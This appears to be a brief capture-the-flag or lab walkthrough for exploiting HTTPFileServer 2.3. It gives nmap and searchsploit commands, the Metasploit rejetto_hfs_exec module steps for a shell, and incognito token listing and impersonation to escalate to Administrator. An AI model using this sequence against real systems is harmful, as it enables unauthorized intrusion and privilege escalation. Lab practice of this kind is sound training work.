`HTTPFileServer httpd 2.3` is required to exploit with `Impersonate`: 
#### Scan the Target
```
nmap Target
nmap -p80 -sV Target
```

#### Search for `hfs`
```
searchsploit hfs
```

#### Metasploit
```
msfdb run
use exploit/windows/http/rejetto_hfs_exec
set rhosts TARGET
exploit
```

We have unprivileged user shell, so we can't read flag.txt.

#### `incognito` plugin to check all available Tokens
```
load incognito
```

#### List Tokens
```
list_tokens -u
```

#### If Administrator user Token is available
```
impersonate_token ATTACKDEFENSE\\Administrator
```

